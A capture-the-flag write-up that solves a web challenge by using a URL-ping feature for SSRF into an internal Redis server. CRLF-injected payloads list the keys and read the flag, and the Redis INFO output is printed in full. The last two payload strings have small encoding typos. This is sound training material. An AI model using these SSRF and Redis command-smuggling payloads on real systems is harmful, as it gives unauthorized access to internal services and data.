### Challenge
The web challenge said:
> Find out what redpwn is doing with red-pwn-is
> 
> hint: red-pwn-is could be better thought of as red-is-pwn

The site allowed to ping an URL, so the first thing that come up in my mind was a SSRF attack.
In facts, trying with http://127.0.0.1, it returned:

```
debug response:


HTTP/1.1 200 OK
Date: Mon, 19 Aug 2019 18:10:27 GMT
Connection: keep-alive
Transfer-Encoding: chunked

181

<!doctype html>
<style>
  div {
    position: absolute;
    top: 50%;
    left: 50%;
    transform: translate(-50%, -50%);
  }
</style>
<div>
  <h3><i>red pwn is</i> figures out what redpwn is doing! give <i>red pwn is</i> a URL, and <i>red pwn is</i> will ping you to say what redpwn is doing!</h3>
  <form method="POST">
    url:
    <input type="text" name="url">
  </form>
</div>

0
```

However, HTTP was the only admitted protocol, because with other URL schemas the site returned
`
only the http protocol is supported 
`

After a long time, I understood the given hint, it was a wordplay with **Red**-pwn-**is**.
Personally, I didn&apos;t know anything about Redis, thus I started to find out how it works.

### Redis
Redis works on port 6379, hence I typed:

`http:127.0.0.1:6379`

Server response was:
```
debug response:
-ERR wrong number of arguments for 'get' command

```

At these point, I was sure that It was a Redis service.
Then, I started to search how [Redis protocol](https://redis.io/topics/protocol "Redis protocol") works.

Finally, I found this [resource](https://www.agarri.fr/blog/archives/2014/09/11/trying_to_hack_redis_via_http_requests/index.html) that explains how to use redis via http request.

There are some fundamentals things to know to send HTTP request(*form link above*):
> 
	- everything is separated with new lines (here CRLF)
	- a command starts with '*' and the number of arguments ("*1" + CRLF)
	- then we have the arguments, one by one:
	   - string: the '$' character + the string size ("$4" + CRLF) + the string value ("TIME" + CRLF)
	   - integer: the ':' character + the integer in ASCII (":42" + CRLF)


Therefore, following the [command list](https://redis.io/commands), a simple INFO request:

`*1 INFO `

become:

`%0d%0a*1%0d%0aINFO%0d%0a`

that returned:

    
    $-1
    $3305
    # Server
    redis_version:5.0.5
    redis_git_sha1:00000000
    redis_git_dirty:0
    redis_build_id:8160a3edb641e7cf
    redis_mode:standalone
    os:Linux 4.6.0-kali1-amd64 x86_64
    arch_bits:64
    multiplexing_api:epoll
    atomicvar_api:atomic-builtin
    gcc_version:8.3.0
    process_id:8
    run_id:675167eb19c73df259f4a968ed11ec817d06e511
    tcp_port:6379
    uptime_in_seconds:24178
    uptime_in_days:0
    hz:10
    configured_hz:10
    lru_clock:5958458
    executable:/usr/src/app/redis-server
    config_file:/usr/local/etc/redis/redis.conf
    
    # Clients
    connected_clients:1
    client_recent_max_input_buffer:83
    client_recent_max_output_buffer:0
    blocked_clients:0
    
    # Memory
    used_memory:848216
    used_memory_human:828.34K
    used_memory_rss:3067904
    used_memory_rss_human:2.93M
    used_memory_peak:848216
    used_memory_peak_human:828.34K
    used_memory_peak_perc:100.12%
    used_memory_overhead:834942
    used_memory_startup:785144
    used_memory_dataset:13274
    used_memory_dataset_perc:21.05%
    allocator_allocated:841392
    allocator_active:1040384
    allocator_resident:4001792
    total_system_memory:12731805696
    total_system_memory_human:11.86G
    used_memory_lua:37888
    used_memory_lua_human:37.00K
    used_memory_scripts:0
    used_memory_scripts_human:0B
    number_of_cached_scripts:0
    maxmemory:0
    maxmemory_human:0B
    maxmemory_policy:noeviction
    allocator_frag_ratio:1.24
    allocator_frag_bytes:198992
    allocator_rss_ratio:3.85
    allocator_rss_bytes:2961408
    rss_overhead_ratio:0.77
    rss_overhead_bytes:-933888
    mem_fragmentation_ratio:3.91
    mem_fragmentation_bytes:2282600
    mem_not_counted_for_evict:0
    mem_replication_backlog:0
    mem_clients_slaves:0
    mem_clients_normal:49694
    mem_aof_buffer:0
    mem_allocator:jemalloc-5.1.0
    active_defrag_running:0
    lazyfree_pending_objects:0
    
    # Persistence
    loading:0
    rdb_changes_since_last_save:0
    rdb_bgsave_in_progress:0
    rdb_last_save_time:1566215368
    rdb_last_bgsave_status:ok
    rdb_last_bgsave_time_sec:-1
    rdb_current_bgsave_time_sec:-1
    rdb_last_cow_size:0
    aof_enabled:0
    aof_rewrite_in_progress:0
    aof_rewrite_scheduled:0
    aof_last_rewrite_time_sec:-1
    aof_current_rewrite_time_sec:-1
    aof_last_bgrewrite_status:ok
    aof_last_write_status:ok
    aof_last_cow_size:0
    
    # Stats
    total_connections_received:16
    total_commands_processed:29
    instantaneous_ops_per_sec:0
    total_net_input_bytes:1871
    total_net_output_bytes:1458
    instantaneous_input_kbps:0.00
    instantaneous_output_kbps:0.00
    rejected_connections:0
    sync_full:0
    sync_partial_ok:0
    sync_partial_err:0
    expired_keys:0
    expired_stale_perc:0.00
    expired_time_cap_reached_count:0
    evicted_keys:0
    keyspace_hits:1
    keyspace_misses:14
    pubsub_channels:0
    pubsub_patterns:0
    latest_fork_usec:0
    migrate_cached_sockets:0
    slave_expires_tracked_keys:0
    active_defrag_hits:0
    active_defrag_misses:0
    active_defrag_key_hits:0
    active_defrag_key_misses:0
    
    # Replication
    role:master
    connected_slaves:0
    master_replid:04c54dbbc3ba265386dd9b420c7e772486e3d333
    master_replid2:0000000000000000000000000000000000000000
    master_repl_offset:0
    second_repl_offset:-1
    repl_backlog_active:0
    repl_backlog_size:1048576
    repl_backlog_first_byte_offset:0
    repl_backlog_histlen:0
    
    # CPU
    used_cpu_sys:10.712000
    used_cpu_user:9.968000
    used_cpu_sys_children:0.000000
    used_cpu_user_children:0.000000
    
    # Cluster
    cluster_enabled:0
    
    # Keyspace
    db0:keys=1,expires=0,avg_ttl=0
    
    -ERR unknown command `HTTP/1.1`, with args beginning with: 

Redis is a **key-value** database, so I needed to know what keys were in the db.

### Exploit

> **Note**: Every line must be teminated with `\r\n`, so URLEncoded is `%0d%0a`

**Get all keys : **

    *2
    $4 
    KEYS 
    $1 
    *
Payload:
`http://127.0.0.1:6379/%0d%0a*2%0d%0a$4%0d%0aKEYS%0d%0a$1%0d%0a*0d%0a`

Server response was:
    
	debug response:
    
    
    $-1
    *1
    $4
    flag
    -ERR unknown command `HTTP/1.1`, with args beginning with: 

**Bingo**, there was a key called flag!

**Get flag key value: **


    *2 
    $3 
    GET 
    $4 
    flag
Payload.
`http://127.0.0.1:6379/%0d%0a*2%0d%0a$3%0d%0aGET%0d%0a$4%0d%0aflag0d%0a`

And the response was:


    
    debug response:

    $-1
    $28
    flag{r3d_pWn_is_buT_n0T_pwN}
    -ERR unknown command `HTTP/1.1`, with args beginning with: 
    


So, flag is:
`flag{r3d_pWn_is_buT_n0T_pwN}`
